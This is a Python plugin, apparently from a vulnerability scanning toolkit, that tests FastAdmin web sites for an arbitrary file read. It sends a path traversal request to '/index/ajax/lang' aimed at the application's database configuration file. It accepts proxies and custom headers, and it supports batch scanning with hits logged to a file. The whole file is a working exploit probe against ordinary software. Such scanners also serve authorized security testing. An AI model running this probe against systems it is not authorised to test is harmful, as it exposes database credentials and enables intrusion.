#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class FastAdminDBFileReadScan:

    def run(self, urls):
        try:
            url = urls + '/index/ajax/lang?lang=..//..//application/database'

            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,proxies=self.proxy)
            if "jsonpReturn" in response.text:
                OutPrintInfoSuc("FastAdmin", f'FastAdmin-任意文件读取执行完成: {url}')
                if self.batch:
                    OutPutFile("fastadmin_read_file.txt", f'FastAdmin-任意文件读取执行完成: {url}')
            else:
                if not self.batch:
                    OutPrintInfo("FastAdmin", '不存在FastAdmin-任意文件读取')
        except Exception:
            if not self.batch:
                OutPrintInfo("FastAdmin", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        self.timeout = int(target["timeout"])
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy)
        if not self.batch:
            OutPrintInfo("FastAdmin",'开始执行FastAdmin-任意文件读取')
        self.run(url)
        if not self.batch:
            OutPrintInfo("FastAdmin",'FastAdmin-任意文件读取执行结束')